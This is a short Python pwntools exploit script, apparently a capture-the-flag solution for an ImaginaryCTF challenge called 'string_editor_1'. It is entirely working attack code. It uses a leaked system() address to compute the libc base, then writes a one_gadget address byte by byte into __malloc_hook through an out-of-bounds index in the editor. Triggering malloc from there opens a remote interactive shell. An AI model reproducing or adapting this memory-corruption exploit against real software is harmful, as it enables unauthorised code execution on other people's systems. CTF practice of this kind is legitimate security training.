from pwn import *
#p=process('./string_editor_1')
p=remote('chal.imaginaryctf.org',42004)
elf = ELF('././string_editor_1')
libc = ELF('libc.so.6')
#raw_input("DEBUG")


def change(idx,a):
	p.recvuntil('(enter in 15 to get a fresh pallette)\n')
	p.sendline(str(idx))
	p.recvuntil('should be in that index?\n')
	p.sendline(a)


p.recvuntil('our sponsors: ')
system = int(p.recv(14),16)
print "System: ",hex(system)
base = system - libc.symbols['system']
print "Base: ",hex(base)
malloc = base + libc.symbols['__malloc_hook']
print "__malloc_hook: ",hex(malloc)
#0xe6c7e 0xe6c81 0xe6c84
one = base + 0xe6c81
print "One: ",hex(one)
change(0,"a")
p.recvuntil('DEBUG: ')
heap = int(p.recv(14),16)
print "Heap: ",hex(heap)

addr = malloc - heap

b=0
for i in p64(one):
	change(addr+b,i)
	b+=1
	
p.sendline("15")

p.interactive()